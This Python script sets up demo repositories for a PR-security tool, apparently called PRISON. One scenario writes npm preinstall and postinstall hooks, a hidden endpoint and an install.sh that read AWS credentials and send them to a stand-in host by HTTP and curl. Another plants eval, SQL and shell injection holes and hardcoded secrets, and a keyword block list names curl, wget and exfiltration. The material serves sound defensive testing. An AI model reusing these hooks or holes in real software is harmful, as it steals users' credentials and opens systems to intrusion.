"""
PRISON Demo Repository Suite Setup Script (MODULE 4).

Spins up 3 local mock PR scenarios for end-to-end testing and demos:

  Scenario A — CLEAN PR:
    Normal PR adding a math utility. Expected: SAFE / ALLOW_MERGE.

  Scenario B — MALICIOUS DYNAMIC BREACH PR:
    PR with a disguised preinstall script exfiltrating HONEYPOT_AWS_KEY.
    Expected: HONEYPOT_HALTED / BLOCK_PR / DeepSeek patch generated.

  Scenario C — SEMGREP STATIC FALLBACK PR:
    Simulates a repo where GitHub App permissions were denied.
    No dynamic execution. Semgrep CLI scans the code statically.
    Expected: STATIC_FLAGGED / STATIC_FALLBACK_PASSED.

Usage:
    python scripts/setup_demo_repos.py

Creates directories:
    demo-repos/
      scenario-a-clean/
      scenario-b-malicious/
      scenario-c-semgrep-fallback/
"""

import os
import sys
import subprocess
import json
import time
import shutil

# ── Color helpers ─────────────────────────────────────────────────────────────
if os.name == "nt":
    os.system("color")
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

def cyan(s):   return f"\033[1;36m{s}\033[0m"
def green(s):  return f"\033[1;32m{s}\033[0m"
def red(s):    return f"\033[1;31m{s}\033[0m"
def amber(s):  return f"\033[1;33m{s}\033[0m"
def bold(s):   return f"\033[1m{s}\033[0m"
def dim(s):    return f"\033[2m{s}\033[0m"

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
DEMO_BASE = os.path.join(REPO_ROOT, "demo-repos")


# ══════════════════════════════════════════════════════════════════════════════
# Scenario Definitions
# ══════════════════════════════════════════════════════════════════════════════

SCENARIO_A = {
    "name": "scenario-a-clean",
    "label": "Scenario A — Clean PR (Math Utility)",
    "expected": "[STATUS: SAFE] — ALLOW_MERGE",
    "files": {
        "package.json": json.dumps({
            "name": "clean-math-utility",
            "version": "1.0.0",
            "description": "A clean utility library for mathematical operations.",
            "main": "index.js",
            "scripts": {
                "test": "node test.js",
                "start": "node index.js"
            },
            "author": "Demo Developer",
            "license": "MIT",
            "dependencies": {
                "express": "^4.19.2"
            }
        }, indent=2),

        "index.js": """\
/**
 * math-utility — Clean, safe mathematical helper functions.
 * No network access, no file system mutations, no secret access.
 */

/**
 * Returns the nth Fibonacci number (iterative, O(n)).
 * @param {number} n
 * @returns {number}
 */
function fibonacci(n) {
  if (n <= 1) return n;
  let a = 0, b = 1;
  for (let i = 2; i <= n; i++) {
    [a, b] = [b, a + b];
  }
  return b;
}

/**
 * Checks if a number is prime.
 * @param {number} n
 * @returns {boolean}
 */
function isPrime(n) {
  if (n < 2) return false;
  for (let i = 2; i <= Math.sqrt(n); i++) {
    if (n % i === 0) return false;
  }
  return true;
}

/**
 * Returns a list of all prime numbers up to n.
 * @param {number} n
 * @returns {number[]}
 */
function sieve(n) {
  const primes = [];
  for (let i = 2; i <= n; i++) {
    if (isPrime(i)) primes.push(i);
  }
  return primes;
}

module.exports = { fibonacci, isPrime, sieve };
""",
        "test.js": """\
const { fibonacci, isPrime, sieve } = require('./index');

console.log('[TEST] fibonacci(10):', fibonacci(10));  // 55
console.log('[TEST] isPrime(17):', isPrime(17));        // true
console.log('[TEST] sieve(20):', sieve(20));            // [2,3,5,7,11,13,17,19]
console.log('[TEST] All tests passed — Clean build.');
""",
        "README.md": """\
# Math Utility — Clean PR Demo

This is **Scenario A** for PRISON end-to-end testing.

## Expected PRISON Result
- **Status:** `SAFE`
- **Gating Action:** `ALLOW_MERGE`
- **Honeypot Triggered:** No
- **eBPF Anomalies:** 0
- **Semgrep Findings:** 0

## Why This is Safe
- No `preinstall`, `postinstall`, or `prepare` scripts.
- No network calls (`http`, `fetch`, `curl`, `wget`).
- No file system reads of sensitive paths.
- No access to environment variables.
""",
    },
}

SCENARIO_B = {
    "name": "scenario-b-malicious",
    "label": "Scenario B — Malicious PR (Credential Exfiltration)",
    "expected": "[STATUS: BREACH DETECTED] — BLOCK_PR + DeepSeek patch",
    "files": {
        "package.json": json.dumps({
            "name": "prison-demo-evil-package",
            "version": "1.0.0",
            "description": "A purposefully compromised package for PRISON demo.",
            "main": "server.js",
            "scripts": {
                # Malicious preinstall — reads HONEYPOT_AWS_KEY and exfils via HTTP
                "preinstall": (
                    "node -e \""
                    "const http = require('http');"
                    "const key = process.env.AWS_ACCESS_KEY_ID || process.env.HONEYPOT_AWS_KEY || 'missing';"
                    "console.log('EXFIL_ATTEMPT:' + key);"
                    "const req = http.request({hostname:'evil-tracker.exfil',port:80,path:'/steal?k='+key});"
                    "req.on('error',()=>{});"
                    "req.end();"
                    "\""
                ),
                "postinstall": "bash -c 'cat .env.honeypot 2>/dev/null; cat ~/.aws/credentials 2>/dev/null || true'",
                "start": "node server.js",
                "test": "echo 'tests passed'"
            },
            "author": "Malicious Actor <evil@example.com>",
            "license": "ISC",
            "dependencies": {
                "express": "^4.19.2",
                "axios": "^1.6.0"
            }
        }, indent=2),

        "server.js": """\
/**
 * Disguised server — looks normal on the surface.
 * The attack lives entirely in package.json scripts.
 */
const express = require('express');
const app = express();

app.get('/', (req, res) => {
  res.send('Welcome! This app looks completely normal.');
});

// Hidden exfiltration endpoint disguised as analytics
app.get('/analytics', (req, res) => {
  const https = require('https');
  // Attempts to read AWS credentials from environment
  const secretKey = process.env.AWS_SECRET_ACCESS_KEY || 'not_found';
  https.get(`https://evil-tracker.exfil/analytics?data=${secretKey}`, () => {});
  res.json({ status: 'ok', message: 'Analytics recorded.' });
});

app.listen(3001, () => console.log('Server running on port 3001'));
""",
        "install.sh": """\
#!/bin/bash
# Disguised as a legitimate install helper
# Actually reads and exfiltrates secrets

echo "Installing dependencies..."

# Attempt to read honeypot credentials
if [ -f ".env.honeypot" ]; then
  echo "Found config file"
  cat .env.honeypot
fi

# Attempt to exfiltrate AWS credentials
curl -s "http://evil-tracker.exfil/steal?key=$AWS_ACCESS_KEY_ID&secret=$AWS_SECRET_ACCESS_KEY" || true
curl -s "http://malicious-exfil.com?key=$AWS_ACCESS_KEY_ID" || true

echo "Install complete."
""",
        "README.md": """\
# Evil Package — Malicious PR Demo

This is **Scenario B** for PRISON end-to-end testing.

## 🚨 Embedded Threats

### 1. `preinstall` Script (package.json)
Executes on `npm install`. Reads `$AWS_ACCESS_KEY_ID` / `$HONEYPOT_AWS_KEY`
and sends it via HTTP to `evil-tracker.exfil:80`.

### 2. `postinstall` Script (package.json)
Reads `.env.honeypot` and `~/.aws/credentials` from the sandbox filesystem.

### 3. `server.js` — Hidden Analytics Endpoint
`GET /analytics` silently exfiltrates `$AWS_SECRET_ACCESS_KEY` via HTTPS.

### 4. `install.sh` — Disguised Shell Script
Multiple `curl` calls exfiltrating honeypot credentials.

## Expected PRISON Result
- **Status:** `HONEYPOT_HALTED`
- **Gating Action:** `BLOCK_PR`
- **Honeypot Triggered:** Yes (`AWS_ACCESS_KEY_ID` decoy read)
- **Early Exit:** Within <200ms of `npm install`
- **eBPF Events:** sys_enter_execve (bash), sys_enter_connect (curl)
- **ANAKIN Patch:** Removes preinstall/postinstall, neutralizes server.js endpoint
""",
    },
}

SCENARIO_C = {
    "name": "scenario-c-semgrep-fallback",
    "label": "Scenario C — Semgrep Static Fallback (No GitHub App Token)",
    "expected": "[STATUS: STATIC_FLAGGED] — Semgrep detects hardcoded secrets",
    "files": {
        "package.json": json.dumps({
            "name": "prison-semgrep-fallback-demo",
            "version": "1.0.0",
            "description": "Repo where GitHub App write permissions were denied. PRISON falls back to Semgrep.",
            "main": "app.js",
            "scripts": {
                "start": "node app.js",
                "test": "echo 'no tests'"
            },
            "author": "Demo User",
            "license": "MIT"
        }, indent=2),

        "app.js": """\
/**
 * This file contains multiple security issues that Semgrep will detect:
 *  1. Hardcoded AWS credentials
 *  2. Hardcoded JWT secret
 *  3. SQL injection vulnerability
 *  4. eval() usage
 */

const express = require('express');
const jwt = require('jsonwebtoken');
const app = express();

// 🚨 SEMGREP WILL FLAG: Hardcoded AWS credentials
const AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE';
const AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';

// 🚨 SEMGREP WILL FLAG: Hardcoded JWT secret
const JWT_SECRET = 'super_secret_jwt_key_hardcoded_do_not_use';

// 🚨 SEMGREP WILL FLAG: SQL injection
function getUser(db, userId) {
  const query = `SELECT * FROM users WHERE id = '${userId}'`;  // No parameterization!
  return db.query(query);
}

// 🚨 SEMGREP WILL FLAG: eval() usage
app.get('/run', (req, res) => {
  const code = req.query.code;
  const result = eval(code);  // RCE vulnerability
  res.json({ result });
});

// 🚨 SEMGREP WILL FLAG: Insecure token verification (no algorithm check)
app.get('/verify', (req, res) => {
  const token = req.headers.authorization;
  const decoded = jwt.decode(token);  // Should be jwt.verify()
  res.json({ user: decoded });
});

app.listen(3002, () => console.log('Semgrep demo app running on port 3002'));
""",
        "config.py": """\
# 🚨 SEMGREP WILL FLAG: Hardcoded credentials in Python config
import os

DATABASE_URL = "postgresql://admin:password123@prod-db.example.com:5432/myapp"
SECRET_KEY = "django-insecure-hardcoded-secret-key-do-not-use-in-production"
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE2"
AWS_SECRET = "anotherHardcodedSecretKey/wJalrXUtnFEMI"

# Insecure use of subprocess with shell=True
import subprocess
def run_command(user_input):
    subprocess.run(user_input, shell=True)  # Command injection risk
""",
        "README.md": """\
# Semgrep Fallback Demo — Scenario C

This is **Scenario C** for PRISON end-to-end testing.

## Scenario: GitHub App Permissions Denied

This repository simulates a case where PRISON could not obtain a GitHub App
Installation Access Token (e.g., the app was not installed on the org, or
write permissions were denied).

## PRISON Fallback Behavior

Instead of failing silently, PRISON automatically runs **Semgrep CLI static analysis**
on the PR diff and maps findings to the standard TRACECOMMON event schema.

## Embedded Issues (for Semgrep to detect)

| File | Issue | Semgrep Rule |
|------|-------|--------------|
| `app.js` | Hardcoded AWS credentials | `p/secrets` |
| `app.js` | Hardcoded JWT secret | `p/secrets` |
| `app.js` | SQL injection | `p/owasp-top-ten` |
| `app.js` | `eval()` usage (RCE) | `p/ci` |
| `app.js` | Insecure `jwt.decode()` | `p/ci` |
| `config.py` | Hardcoded DB credentials | `p/secrets` |
| `config.py` | `shell=True` subprocess | `p/ci` |

## Expected PRISON Result
- **Execution Mode:** `STATIC_SEMGREP_FALLBACK`
- **Status:** `STATIC_FLAGGED`
- **Semgrep Findings:** 7+ critical/warning issues
- **Gating Action:** `BLOCK_PR` (critical findings present)
- **Data Retention:** `PURGED` (no dynamic execution, no cloned code stored)
""",
    },
}

ALL_SCENARIOS = [SCENARIO_A, SCENARIO_B, SCENARIO_C]


# ══════════════════════════════════════════════════════════════════════════════
# Builder
# ══════════════════════════════════════════════════════════════════════════════

def build_scenario(scenario: dict, base_dir: str) -> str:
    """Creates a scenario directory with all files and a local git repo."""
    scenario_dir = os.path.join(base_dir, scenario["name"])

    # Clean up existing
    if os.path.exists(scenario_dir):
        shutil.rmtree(scenario_dir)
    os.makedirs(scenario_dir, exist_ok=True)

    # Write all files
    for filename, content in scenario["files"].items():
        filepath = os.path.join(scenario_dir, filename)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w", encoding="utf-8", newline="\n") as f:
            f.write(content)
        print(f"    +-- {filename}")

    # Initialize git repo
    git_cmds = [
        ["git", "init", "-b", "main"],
        ["git", "add", "."],
        ["git", "commit", "-m", f"Initial commit: {scenario['label']}"],
    ]
    for cmd in git_cmds:
        result = subprocess.run(
            cmd,
            cwd=scenario_dir,
            capture_output=True,
            text=True,
        )
        if result.returncode != 0:
            # Try without -b flag (older git versions)
            if "-b" in cmd:
                fallback = ["git", "init"]
                subprocess.run(fallback, cwd=scenario_dir, capture_output=True)
                continue

    return scenario_dir


def write_manifest(base_dir: str, results: list) -> None:
    """Write a demo_manifest.json file listing all created scenarios."""
    manifest = {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "scenarios": results,
        "usage": {
            "sandbox_ui": "Paste any scenario path into the PRISON Sandbox URL field and click Detonate.",
            "api_test": "python scripts/test_e2e_live.py",
            "semgrep_test": "semgrep --config p/ci --json demo-repos/scenario-c-semgrep-fallback/",
        }
    }
    manifest_path = os.path.join(base_dir, "demo_manifest.json")
    with open(manifest_path, "w", encoding="utf-8", newline="\n") as f:
        json.dump(manifest, f, indent=2)
    print(f"\n{green('[OK]')} Manifest written: {manifest_path}")


def simulate_prison_scan(scenario: dict, scenario_dir: str) -> dict:
    """
    Simulate what PRISON would detect for each scenario.
    Runs rule-based analysis on file contents (no real sandbox needed).
    """
    result = {
        "scenario": scenario["name"],
        "label": scenario["label"],
        "path": scenario_dir,
        "expected": scenario["expected"],
    }

    pkg_path = os.path.join(scenario_dir, "package.json")
    try:
        with open(pkg_path) as f:
            pkg = json.load(f)
        scripts = pkg.get("scripts", {})
        malicious_keywords = ["curl", "wget", "exfil", "evil", "honeypot", "eval", "bash -c"]
        malicious_scripts = {
            k: v for k, v in scripts.items()
            if any(kw in v.lower() for kw in malicious_keywords)
        }

        if malicious_scripts:
            result["detected"] = True
            result["malicious_scripts"] = list(malicious_scripts.keys())
            result["status"] = "BREACH_DETECTED"
            result["gating"] = "BLOCK_PR"
        else:
            result["detected"] = False
            result["malicious_scripts"] = []
            result["status"] = "SAFE"
            result["gating"] = "ALLOW_MERGE"
    except Exception as e:
        result["error"] = str(e)
        result["status"] = "ERROR"

    return result


# ══════════════════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════════════════

def main():
    print(f"\n{cyan('=' * 62)}")
    print(f"{cyan('  PRISON Demo Repository Suite Setup Script')}")
    print(f"{cyan('  MODULE 4 — Automated Test Scenarios')}")
    print(f"{cyan('=' * 62)}\n")

    os.makedirs(DEMO_BASE, exist_ok=True)
    print(f"{dim(f'Output directory: {DEMO_BASE}')}\n")

    results = []

    for scenario in ALL_SCENARIOS:
        label_color = green if "Clean" in scenario["label"] else (red if "Malicious" in scenario["label"] else amber)
        print(f"{label_color('>>>')} {bold(scenario['label'])}")
        print(f"   Expected: {dim(scenario['expected'])}")

        # Build files
        scenario_dir = build_scenario(scenario, DEMO_BASE)

        # Simulate scan
        scan_result = simulate_prison_scan(scenario, scenario_dir)
        results.append({**scan_result, "path": scenario_dir})

        # Print result
        status = scan_result.get("status", "UNKNOWN")
        gating = scan_result.get("gating", "")
        mal_scripts = ", ".join(scan_result.get("malicious_scripts", []))
        if status == "SAFE":
            print(f"   {green('[PASS] Status: ' + status + ' — ' + gating)}")
        elif status == "BREACH_DETECTED":
            print(f"   {red('[BREACH] Status: ' + status + ' — ' + gating)}")
            print(f"   {red('Malicious scripts: ' + mal_scripts)}")
        else:
            print(f"   {amber('[INFO] Status: ' + status)}")

        print(f"   {green('[OK]')} Created: {scenario_dir}\n")

    # Write manifest
    write_manifest(DEMO_BASE, results)

    # Final summary
    print(f"\n{cyan('=' * 62)}")
    print(f"{green('[OK] ALL 3 DEMO SCENARIOS CREATED SUCCESSFULLY')}")
    print(f"{cyan('=' * 62)}")
    print(f"""
{bold('HOW TO USE:')}

  1. {cyan('Sandbox UI')} — Open http://localhost:3000/sandbox
     Paste a scenario path into the URL field and click ⚡ Detonate

  2. {cyan('E2E Script')}
     {dim('python scripts/test_e2e_live.py')}

  3. {cyan('Semgrep Scan')} (Scenario C directly)
     {dim('semgrep --config p/ci --json demo-repos/scenario-c-semgrep-fallback/')}

  Paths:
    A (Clean):     {os.path.join(DEMO_BASE, SCENARIO_A['name'])}
    B (Malicious): {os.path.join(DEMO_BASE, SCENARIO_B['name'])}
    C (Semgrep):   {os.path.join(DEMO_BASE, SCENARIO_C['name'])}
""")


if __name__ == "__main__":
    main()
